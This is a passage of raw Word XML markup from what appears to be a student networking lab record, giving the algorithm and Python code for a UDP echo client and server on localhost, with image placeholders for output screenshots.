                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5731510" cy="2304415"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C6C0888" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Client:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17901B15" w14:textId="53649662" w:rsidR="0094061E" w:rsidRDefault="009E61CF" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r w:rsidRPr="009E61CF">
        <w:rPr>
          <w:rFonts w:ascii="Aptos" w:eastAsia="Aptos" w:hAnsi="Aptos" w:cs="Cordia New"/>
          <w:noProof/>
          <w:kern w:val="2"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="30"/>
          <w:lang w:bidi="th-TH"/>
          <w14:ligatures w14:val="standardContextual"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="54EA1D9E" wp14:editId="347F2571">
            <wp:extent cx="5731510" cy="2119630"/>
            <wp:effectExtent l="0" t="0" r="2540" b="0"/>
            <wp:docPr id="863400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400445" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId27"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5731510" cy="2119630"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E6BA7A9" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="3ECDF145" w14:textId="77777777" w:rsidR="009E61CF" w:rsidRDefault="009E61CF" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="530BA641" w14:textId="317A6052" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>UDP Client-Server Communication Using Socket programming in python:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00F5FDBC" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Algorithm:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7813BAE8" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Server:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27F65D88" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>1. Create a UDP socket using socket.socket(AF_INET, SOCK_DGRAM).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="316EE42D" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>2. Bind the socket to 'localhost' and a specific port using bind().</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06346DEA" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>3. Wait to receive a message from a client using recvfrom().</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24695C23" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>4. Display the received message and send it back using sendto().</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7900720B" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>5. Ask the user whether to continue or close the socket using close().</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21240D34" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Client:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F1B4B72" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>1. Create a UDP socket using `socket.socket(AF_INET, SOCK_DGRAM)`.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="552A4029" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>2. Enter the message to send to the server.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50EC4686" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>3. Send the message using `sendto()` with the server’s address and port.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="135A7686" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>4. Receive the server’s reply using `recvfrom()` and display it.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10819F1E" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>5. Ask the user whether to continue or close the socket using `close()`.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57C1EA5C" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="19FF4945" w14:textId="77777777" w:rsidR="00D97D3B" w:rsidRDefault="00D97D3B" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4548A88F" w14:textId="20453497" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Program Code:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F774753" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Server:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DF7F8AA" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>import socket</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D0B96D4" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>sockfd = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20A633A3" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>print("UDP Socket Created")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2317A7EB" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>sockfd.bind(('localhost', 8000))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D91A295" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>print("Waiting for messages...")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37172185" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>while True:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D6DBAAB" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">    data, addr = sockfd.recvfrom(1024)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="459EF34F" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">    print("Message Received from Client:", data.decode())</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DE8F895" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">    sockfd.sendto(data, addr)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D9578FE" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">    print("Message reply sent to Client!")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A4F94B3" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">    choice = input("Do you want to continue (y/n): ")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A084435" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">    if choice.lower() == 'n':</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A2D9366" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">        break</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="317C8A7F" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>sockfd.close()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11D9E6D5" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Client:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F7931CC" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>import socket</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="177856B3" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>clientfd = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EA2C09A" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>while True:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44C3E143" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">    msg = input("Enter message to send: ")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29A590FF" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">    clientfd.sendto(msg.encode(), ('localhost', 8000))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FB84F51" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">    data, addr = clientfd.recvfrom(1024)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CC7B79B" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">    print("Message from Server:", data.decode())</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44DBA5B3" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">    choice = input("Do you want to continue (y/n): ")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3970AF8D" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">    if choice.lower() == 'n':</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="330B80CD" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">        break clientfd.close()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B590460" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="366303E7" w14:textId="77777777" w:rsidR="00D97D3B" w:rsidRDefault="00D97D3B" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0109B0CB" w14:textId="71AA8952" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Output:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BD00E05" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Server:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27B6D173" w14:textId="18B9EBD0" w:rsidR="0094061E" w:rsidRDefault="00377011" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r w:rsidRPr="00377011">
        <w:rPr>
          <w:rFonts w:ascii="Aptos" w:eastAsia="Aptos" w:hAnsi="Aptos" w:cs="Cordia New"/>
          <w:noProof/>
          <w:kern w:val="2"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="30"/>
          <w:lang w:bidi="th-TH"/>
          <w14:ligatures w14:val="standardContextual"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="2F983D37" wp14:editId="7E7138B9">
            <wp:extent cx="5731510" cy="1978660"/>
            <wp:effectExtent l="0" t="0" r="2540" b="2540"/>
            <wp:docPr id="14432032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203220" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId28"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5731510" cy="1978660"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B8E02EB" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Client:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0212B88F" w14:textId="2ABCBBBE" w:rsidR="0094061E" w:rsidRDefault="00F222CC" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r w:rsidRPr="00F222CC">
        <w:rPr>
          <w:rFonts w:ascii="Aptos" w:eastAsia="Aptos" w:hAnsi="Aptos" w:cs="Cordia New"/>
          <w:noProof/>
          <w:kern w:val="2"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="30"/>
          <w:lang w:bidi="th-TH"/>
          <w14:ligatures w14:val="standardContextual"/>
        </w:rPr>
        <w:drawing>
